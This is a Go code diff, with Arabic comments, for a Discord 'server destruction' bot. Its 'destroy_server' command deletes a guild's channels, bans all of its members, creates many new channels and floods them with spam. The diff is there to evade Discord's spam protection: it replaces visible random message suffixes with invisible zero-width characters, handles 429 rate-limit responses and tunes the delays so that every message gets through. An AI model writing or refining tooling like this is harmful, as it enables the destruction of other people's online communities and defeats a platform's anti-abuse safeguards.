@@ -37,7 +37,7 @@ func main() {
 	cmdName := "destroy_server"
 	command := &discordgo.ApplicationCommand{
 		Name:        cmdName,
-		Description: "أمر تدمير السيرفر (بسرعة صاروخية وتخطي حظر تكرار الرسائل)",
+		Description: "أمر تدمير السيرفر (ضمان وصول جميع الرسائل بدون فقدان)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -82,7 +82,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تدمير السيرفر وإرسال السبام بترميز فريد لتجاوز الحظر...",
+					Content: "🚀 جاري تنفيذ السبام بضمان وصول العدد كاملاً...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -130,7 +130,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		"Content-Type":  "application/json",
 	}
 
-	// 1. حذف الرومات القديمة بالتوازي السريع جداً
+	// 1. حذف الرومات القديمة بالتوازي
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -160,7 +160,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		}
 	}()
 
-	// 2. جلب وباند جميع الأعضاء بالكامل
+	// 2. باند جميع الأعضاء بالكامل
 	go func() {
 		var userIDs []string
 		lastID := "0"
@@ -220,7 +220,7 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		}
 	}()
 
-	// 3. إنشاء الرومات بسرعة فائقة (10 رومات في الدفعة وبفاصل 40ms)
+	// 3. إنشاء الرومات
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
@@ -263,11 +263,13 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 			}()
 		}
 		wg.Wait()
-		time.Sleep(40 * time.Millisecond)
+		time.Sleep(50 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مع الرمز العشوائي الفريد لكل رسالة لتخطي الحظر بالكامل
+	// 4. إرسال الرسائل بالعدد الكامل مع فاصل زمني آمن يمنع حظر ديسكورد ويضمن وصول كل رسالة
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+	hiddenChars := []string{"\u200B", "\u200C", "\u200D", "\uFEFF"}
+
 	for i := 0; i < len(channelIDs); i += groupSize {
 		end := i + groupSize
 		if end > len(channelIDs) {
@@ -277,9 +279,11 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 		for _, chID := range channelIDs[i:end] {
 			go func(cID string) {
 				for m := 0; m < messagesCount; m++ {
-					// إضافة رمز عشوائي فريد لكل رسالة لتجنب الحظر الصامت من ديسكورد
-					uniqueSuffix := fmt.Sprintf(" ||`[%d-%d]`||", rng.Intn(999999), m)
-					finalMsg := messageContent + uniqueSuffix
+					invisibleSalt := ""
+					for k := 0; k <= (m % 4); k++ {
+						invisibleSalt += hiddenChars[rng.Intn(len(hiddenChars))]
+					}
+					finalMsg := messageContent + invisibleSalt
 
 					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
 					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
@@ -289,12 +293,17 @@ func executeDestruction(token, guildID, roomName string, roomsCount int, message
 
 					msgResp, err := client.Do(msgReq)
 					if err == nil {
+						// التحقق من حالة الـ Rate Limit لضمان عدم إسقاط الطلب
+						if msgResp.StatusCode == 429 {
+							time.Sleep(500 * time.Millisecond)
+						}
 						msgResp.Body.Close()
 					}
-					time.Sleep(10 * time.Millisecond)
+					// زيادة وقت الانتظار إلى 80ms لتجاوز حماية ديسكورد وإرسال العدد كاملاً بدون توقف عند 10
+					time.Sleep(80 * time.Millisecond)
 				}
 			}(chID)
 		}
-		time.Sleep(40 * time.Millisecond)
+		time.Sleep(50 * time.Millisecond)
 	}
 }
